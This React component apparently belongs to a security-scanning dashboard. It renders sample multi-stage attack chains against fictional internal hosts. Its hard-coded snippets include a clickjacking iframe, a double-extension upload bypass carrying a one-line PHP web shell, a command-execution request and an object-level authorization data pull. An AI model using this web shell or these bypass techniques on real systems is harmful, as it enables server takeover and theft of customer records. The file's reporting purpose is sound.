import React, { useState } from 'react';
import { 
  GitBranch, 
  ArrowRight, 
  Play, 
  ShieldAlert, 
  Lock, 
  Terminal, 
  Code, 
  CheckCircle2, 
  ExternalLink,
  Flame,
  Globe,
  Radio,
  ChevronRight,
  History,
  AlertTriangle
} from 'lucide-react';
import { ATTACK_CHAIN, VULNERABILITIES } from '../data/scanData';

export default function AttackChainView({ 
  onSelectVuln, 
  activeScan,
  companyName = "",
  targetUrl = "",
  vulnerabilities = [],
  scanHistory = [],
  activeScanId = '',
  onSelectScan,
  theme = 'light' 
}) {
  const [activeStep, setActiveStep] = useState(0);
  const [isPlaying, setIsPlaying] = useState(false);

  const isSampleAlpha = activeScan?.id?.includes('alpha') || activeScan?.id?.includes('406f');
  const isSampleBeta = activeScan?.id?.includes('beta') || activeScan?.id?.includes('81f4');

  // Define dynamic chain data based on active scan
  const effectiveChain = React.useMemo(() => {
    // 1. If activeScan has custom attackChain with steps or phases
    const rawSteps = activeScan?.attackChain?.steps || activeScan?.attackChain?.phases;
    if (rawSteps && Array.isArray(rawSteps) && rawSteps.length > 0) {
      return {
        title: activeScan.attackChain.title || `${companyName} Attack Vector`,
        targetAsset: activeScan.attackChain.targetHost || targetUrl,
        cvss: activeScan.riskScore || (isSampleBeta ? 8.2 : isSampleAlpha ? 5.5 : 8.3),
        steps: rawSteps.map((s, idx) => ({
          stepNumber: s.step || s.stepNumber || idx + 1,
          type: s.type || (idx === 0 ? 'RECON' : idx === 1 ? 'AUDIT' : idx === 2 ? 'EXPLOIT' : idx === 3 ? 'PIVOT' : 'IMPACT'),
          title: s.name || s.title || `Stage ${idx + 1}`,
          findingRef: s.findingRef || (vulnerabilities[0]?.id || 'vuln-0001'),
          description: s.action || s.description || '',
          impact: s.impact || '',
          target: s.target || targetUrl,
          codeSnippet: s.codeSnippet || (idx === 0 ? `GET / HTTP/1.1\nHost: ${targetUrl}` : `HTTP/1.1 200 OK`)
        }))
      };
    }

    // 2. Sample Alpha Attack Vector
    if (isSampleAlpha) {
      return {
        title: "Perimeter Security & Information Disclosure Attack Vector",
        targetAsset: "cloud.alpha-corp.internal",
        cvss: 5.5,
        steps: [
          {
            stepNumber: 1,
            type: "RECON",
            title: "Autonomous Asset & Endpoint Reconnaissance",
            findingRef: "vuln-0001",
            description: "Autonomous agent probed external web perimeter, TLS certificates, and HTTP response routing.",
            target: "https://cloud.alpha-corp.internal/",
            impact: "Mapped reachable endpoints, server response codes, and exposed headers.",
            codeSnippet: `GET / HTTP/1.1\nHost: cloud.alpha-corp.internal\nUser-Agent: Mozilla/5.0 (Autonomous-VAPT-Agent)\nAccept: text/html,application/xhtml+xml`
          },
          {
            stepNumber: 2,
            type: "AUDIT",
            title: "Security Header & Defense-in-Depth Verification",
            findingRef: "vuln-0001",
            description: "Audited HTTP response headers against OWASP WSTG v4.2 defense criteria. Confirmed total absence of CSP, HSTS, X-Frame-Options, and X-Content-Type-Options.",
            target: "https://cloud.alpha-corp.internal/",
            impact: "Identified complete lack of clickjacking, MIME-sniffing, and transport security controls.",
            codeSnippet: `HTTP/1.1 200 OK\n(Content-Security-Policy: ABSENT)\n(Strict-Transport-Security: ABSENT)\n(X-Frame-Options: ABSENT)\n(X-Content-Type-Options: ABSENT)`
          },
          {
            stepNumber: 3,
            type: "EXPLOIT",
            title: "Target Information Disclosure & Framing Vector",
            findingRef: "vuln-0001",
            description: "Verified that missing X-Frame-Options allows the web application to be embedded in external malicious contexts.",
            target: "https://cloud.alpha-corp.internal/",
            impact: "Elevated risk of adversary reconnaissance, credential phishing overlays, and clickjacking attacks.",
            codeSnippet: `<!-- Proof of Concept Clickjacking Overlay -->\n<iframe src="https://cloud.alpha-corp.internal/" style="opacity:0.8; width:100%; height:600px;"></iframe>`
          }
        ]
      };
    }

    // 3. Sample Beta Attack Chain
    if (isSampleBeta) {
      return {
        title: "Remote File Upload to Member Data Access Chain",
        targetAsset: "portal.beta-energy.internal",
        cvss: 8.2,
        steps: [
          {
            stepNumber: 1,
            type: "RECON",
            title: "Public Endpoint Discovery",
            findingRef: "vuln-0004",
            description: "Autonomous agent identified an unrestricted file upload form on the contact feedback portal without backend extension enforcement.",
            target: "https://portal.beta-energy.internal/contact/submit-attachment",
            impact: "Identified writable upload directory without server-side validation.",
            codeSnippet: `POST /contact/submit-attachment HTTP/1.1\nHost: portal.beta-energy.internal\nContent-Type: multipart/form-data; boundary=---------------------------98721\n\n-----------------------------98721\nContent-Disposition: form-data; name="file"; filename="invoice.php.pdf"\nContent-Type: image/png`
          },
          {
            stepNumber: 2,
            type: "BYPASS",
            title: "MIME Filter Bypass & Payload Upload",
            findingRef: "vuln-0004",
            description: "Crafted double-extension payload bypassing client-side MIME checks, saving executable PHP script inside /uploads/feedback/.",
            target: "https://portal.beta-energy.internal/contact/submit-attachment",
            impact: "Web shell successfully placed in web-accessible storage.",
            codeSnippet: `// Double Extension Validation Bypass:\nContent-Disposition: form-data; name="file"; filename="payload.php.pdf"\nContent-Type: image/png\n\n<?php if(isset($_REQUEST['cmd'])){ echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; } ?>`
          },
          {
            stepNumber: 3,
            type: "EXPLOIT",
            title: "Remote Code Execution (RCE)",
            findingRef: "vuln-0004",
            description: "Invoked the uploaded script over HTTP GET, executing arbitrary commands under the web server daemon context.",
            target: "https://portal.beta-energy.internal/uploads/feedback/payload.php",
            impact: "Full server execution and access to environment configurations.",
            codeSnippet: `GET /uploads/feedback/payload.php?cmd=id;uname -a HTTP/1.1\nHost: portal.beta-energy.internal\n\nHTTP/1.1 200 OK\nuid=33(www-data) gid=33(www-data) groups=33(www-data)`
          },
          {
            stepNumber: 4,
            type: "PIVOT",
            title: "Internal Member API BOLA Access",
            findingRef: "vuln-0001",
            description: "Used server access to query internal customer API endpoints, extracting member records and billing accounts without tenant isolation.",
            target: "https://portal.beta-energy.internal/api/v1/accounts/details",
            impact: "Unauthorized extraction of customer billing records and telemetry.",
            codeSnippet: `POST /api/v1/accounts/details HTTP/1.1\nHost: portal.beta-energy.internal\nAuthorization: Bearer <VALID_MEMBER_TOKEN>\nContent-Type: application/json\n\n{"accountId": "ACC-MEM-0098412", "includeBilling": true}\n\nHTTP/1.1 200 OK\n{"status":"success","member":"Jane Doe","meterId":"MTR-98214","balance":142.50}`
          }
        ]
      };
    }

    // 4. Default Demonstration Chain
    return ATTACK_CHAIN;
  }, [activeScan, companyName, targetUrl, isSampleBeta, isSampleAlpha, vulnerabilities]);

  const steps = effectiveChain.steps || [];
  const safeActiveStep = Math.min(activeStep, steps.length - 1);
  const currentStepData = steps[safeActiveStep] || steps[0] || {};
  const linkedVuln = vulnerabilities.find(v => v.id === currentStepData.findingRef);

  const handlePlaySimulation = () => {
    setIsPlaying(true);
    let step = 0;
    const interval = setInterval(() => {
      if (step < steps.length - 1) {
        step++;
        setActiveStep(step);
      } else {
        clearInterval(interval);
        setIsPlaying(false);
      }
    }, 1200);
  };

  if (!activeScan && (!scanHistory || scanHistory.length === 0)) {
    return (
      <div className="space-y-6 max-w-7xl mx-auto pb-12">
        <div className={`p-12 rounded-2xl border text-center space-y-4 ${
          theme === 'dark' ? 'bg-[#0B1120] border-slate-800' : 'bg-white border-slate-300 shadow-sm'
        }`}>
          <div className="w-12 h-12 rounded-2xl bg-cyan-500/10 text-cyan-400 mx-auto flex items-center justify-center border border-cyan-500/20">
            <GitBranch className="w-6 h-6" />
          </div>
          <div className="space-y-1">
            <h4 className={`text-base font-bold ${theme === 'dark' ? 'text-white' : 'text-slate-900'}`}>
              No Attack Chain Available
            </h4>
            <p className="text-xs text-slate-500 max-w-md mx-auto">
              No chained exploit paths exist for your account yet. Launch an automated security scan to generate an end-to-end attack simulation graph.
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-6 max-w-7xl mx-auto pb-12">
      {/* Scan Session Switcher Banner */}
      {/* Scan Session Switcher Banner */}
      {scanHistory.length > 0 && (
        <div className={`p-4 rounded-2xl border flex flex-col sm:flex-row sm:items-center justify-between gap-4 text-xs font-mono transition-colors ${
          theme === 'dark' ? 'bg-[#001B41] border-[#002B66] text-slate-300' : 'bg-white border-slate-200 text-slate-800 shadow-sm'
        }`}>
          <div className="flex items-center gap-2.5 min-w-0">
            <span className="text-[#006FE3] font-bold uppercase tracking-wider flex items-center gap-1.5 font-heading">
              <History className="w-4 h-4 text-[#006FE3]" />
              Target Attack Graph:
            </span>
            <span className={`font-bold truncate text-sm font-heading ${theme === 'dark' ? 'text-white' : 'text-[#001B41]'}`}>
              {companyName}
            </span>
            <span className="text-slate-400 hidden sm:inline">&bull;</span>
            <span className="text-slate-400 truncate hidden sm:inline font-mono">
              {targetUrl}
            </span>
          </div>

          <div className="flex items-center gap-2 flex-shrink-0">
            <span className={`${theme === 'dark' ? 'text-slate-400' : 'text-slate-600'} text-[11px] font-bold font-sans`}>
              Switch Scan Session:
            </span>
            <select
              value={activeScanId}
              onChange={(e) => {
                const selected = scanHistory.find(s => s.id === e.target.value);
                if (selected && onSelectScan) {
                  onSelectScan(selected, true);
                  setActiveStep(0);
                }
              }}
              className={`px-3 py-1.5 rounded-xl font-mono text-xs focus:outline-none border transition-all ${
                theme === 'dark'
                  ? 'bg-[#001127] border-[#002B66] text-white focus:border-[#006FE3]'
                  : 'bg-slate-50 border-slate-300 text-slate-900 focus:border-[#006FE3]'
              }`}
            >
              {scanHistory.map((scan) => {
                const count = (scan.vulnerabilities && scan.vulnerabilities.length > 0)
                  ? scan.vulnerabilities.length
                  : (scan.findingsCount || (scan.id?.includes('alpha') ? 4 : (scan.id?.includes('beta') ? 4 : 7)));
                return (
                  <option key={scan.id} value={scan.id}>
                    {scan.companyName} ({count} {count === 1 ? 'finding' : 'findings'})
                  </option>
                );
              })}
            </select>
          </div>
        </div>
      )}

      {/* Header Panel */}
      <div className={`p-6 rounded-2xl border space-y-4 transition-colors ${
        theme === 'dark' ? 'bg-[#001B41] border-[#002B66]' : 'bg-white border-slate-200 shadow-sm'
      }`}>
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div className="space-y-1">
            <div className="flex items-center gap-2 text-[#006FE3] font-mono text-xs font-bold uppercase tracking-wider font-heading">
              <GitBranch className="w-4 h-4 text-[#006FE3]" />
              <span>Chained Exploit Path &bull; {companyName}</span>
            </div>
            <h2 className={`text-2xl font-extrabold tracking-tight font-heading ${theme === 'dark' ? 'text-white' : 'text-[#001B41]'}`}>
              {effectiveChain.title}
            </h2>
            <p className={`text-xs ${theme === 'dark' ? 'text-slate-300' : 'text-slate-700'}`}>
              Target: <strong className="text-[#006FE3] font-mono">{effectiveChain.targetAsset}</strong> &bull; Combined Risk: <strong className="text-[#DC2626] font-mono font-bold">HIGH (CVSS {effectiveChain.cvss})</strong>
            </p>
          </div>

          <button
            onClick={handlePlaySimulation}
            disabled={isPlaying}
            className={`flex items-center gap-2 px-5 py-2.5 rounded-xl font-bold text-xs font-heading transition-all ${
              isPlaying
                ? 'bg-[#006FE3]/20 text-[#006FE3] border border-[#006FE3]/40 cursor-wait animate-pulse'
                : 'bg-[#006FE3] hover:bg-[#005bbd] text-white shadow-md shadow-[#006FE3]/25 hover:scale-[1.02] active:scale-[0.98]'
            }`}
          >
            <Play className="w-4 h-4 fill-current" />
            <span>{isPlaying ? 'Simulating Exploit...' : 'Play Exploit Animation'}</span>
          </button>
        </div>
      </div>

      {/* Stepper Card */}
      <div className={`p-6 rounded-2xl border space-y-6 transition-colors ${
        theme === 'dark' ? 'bg-[#001B41] border-[#002B66]' : 'bg-white border-slate-200 shadow-sm'
      }`}>
        <div className={`flex items-center justify-between border-b pb-3 ${
          theme === 'dark' ? 'border-[#002B66]' : 'border-slate-200'
        }`}>
          <span className={`text-xs font-mono font-bold uppercase ${
            theme === 'dark' ? 'text-slate-400' : 'text-slate-700'
          }`}>
            Multi-Stage Attack Path ({steps.length} Stages)
          </span>
          <span className="text-xs font-mono text-[#006FE3] font-bold">
            Click any step to inspect technical payload
          </span>
        </div>

        {/* Step Grid */}
        <div className={`grid grid-cols-1 sm:grid-cols-${steps.length} gap-3`}>
          {steps.map((step, idx) => {
            const isSelected = safeActiveStep === idx;
            const isPassed = safeActiveStep >= idx;

            // Brand stage color assignment
            const isImpact = step.type === 'IMPACT' || step.type === 'EXPLOIT';
            const isPivot = step.type === 'PIVOT' || step.type === 'INTERNAL' || step.type === 'ESCALATE';

            return (
              <div
                key={idx}
                onClick={() => setActiveStep(idx)}
                className={`p-4 rounded-xl cursor-pointer border transition-all ${
                  isSelected
                    ? 'bg-[#006FE3]/15 border-[#006FE3] ring-2 ring-[#006FE3]/40 shadow-lg'
                    : isPassed
                    ? theme === 'dark' ? 'bg-[#001127] border-[#002B66]' : 'bg-slate-50 border-slate-300'
                    : theme === 'dark' ? 'bg-[#001127]/60 border-[#002B66]/60 opacity-60' : 'bg-slate-100 border-slate-200 opacity-60'
                }`}
              >
                <div className="flex items-center justify-between mb-2">
                  <span className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-mono font-bold ${
                    isSelected
                      ? 'bg-[#006FE3] text-white shadow-sm'
                      : isPassed
                      ? isImpact
                        ? 'bg-[#DC2626]/20 text-[#DC2626] border border-[#DC2626]/40'
                        : isPivot
                        ? 'bg-[#3C2C86]/30 text-[#80B7F1] border border-[#3C2C86]'
                        : 'bg-[#006FE3]/20 text-[#006FE3] border border-[#006FE3]/40'
                      : 'bg-slate-200 dark:bg-slate-800 text-slate-600 dark:text-slate-400'
                  }`}>
                    {step.stepNumber}
                  </span>
                  <span className={`text-[10px] font-mono font-bold ${
                    isImpact 
                      ? 'text-[#DC2626]' 
                      : isPivot 
                      ? 'text-[#80B7F1]' 
                      : theme === 'dark' ? 'text-slate-400' : 'text-slate-600'
                  }`}>
                    {step.type}
                  </span>
                </div>

                <div className={`text-xs font-bold font-heading mb-1 line-clamp-1 ${
                  theme === 'dark' ? 'text-white' : 'text-[#001B41]'
                }`}>
                  {step.title}
                </div>
                <div className="text-[11px] font-mono text-[#006FE3] font-bold">
                  Ref: {step.findingRef}
                </div>
              </div>
            );
          })}
        </div>

        {/* Node Detail Box */}
        <div className={`p-6 rounded-xl border space-y-4 ${
          theme === 'dark' ? 'bg-[#001127] border-[#002B66]' : 'bg-slate-50 border-slate-200'
        }`}>
          <div className={`flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b pb-3 ${
            theme === 'dark' ? 'border-[#002B66]' : 'border-slate-200'
          }`}>
            <div className="flex items-center gap-3">
              <span className="text-xs font-mono font-bold px-2.5 py-1 rounded bg-[#006FE3] text-white shadow-sm">
                Step {currentStepData.stepNumber}: {currentStepData.type}
              </span>
              <h3 className={`text-base font-bold font-heading ${theme === 'dark' ? 'text-white' : 'text-[#001B41]'}`}>
                {currentStepData.title}
              </h3>
            </div>

            {linkedVuln && (
              <button
                onClick={() => onSelectVuln(linkedVuln)}
                className={`flex items-center gap-1.5 text-xs font-mono font-bold text-[#006FE3] px-3 py-1.5 rounded-lg border transition-all ${
                  theme === 'dark' ? 'bg-[#001B41] border-[#002B66] hover:bg-[#006FE3] hover:text-white' : 'bg-white border-slate-200 hover:bg-[#006FE3] hover:text-white shadow-sm'
                }`}
              >
                <span>Inspect {currentStepData.findingRef}</span>
                <ExternalLink className="w-3.5 h-3.5" />
              </button>
            )}
          </div>

          <p className={`text-xs sm:text-sm leading-relaxed font-sans ${
            theme === 'dark' ? 'text-slate-300' : 'text-slate-700'
          }`}>
            {currentStepData.description}
          </p>

          {currentStepData.impact && (
            <div className="p-3.5 rounded-xl bg-[#DC2626]/10 border border-[#DC2626]/30 text-[#DC2626] text-xs font-mono leading-relaxed">
              <strong>Impact:</strong> {currentStepData.impact}
            </div>
          )}

          {/* Technical Code Snippet */}
          {currentStepData.codeSnippet && (
            <pre className="p-4 rounded-xl bg-[#000E20] border border-[#002B66] text-cyan-300 font-mono text-xs overflow-x-auto select-all leading-relaxed">
              <code>{currentStepData.codeSnippet}</code>
            </pre>
          )}
        </div>
      </div>
    </div>
  );
}
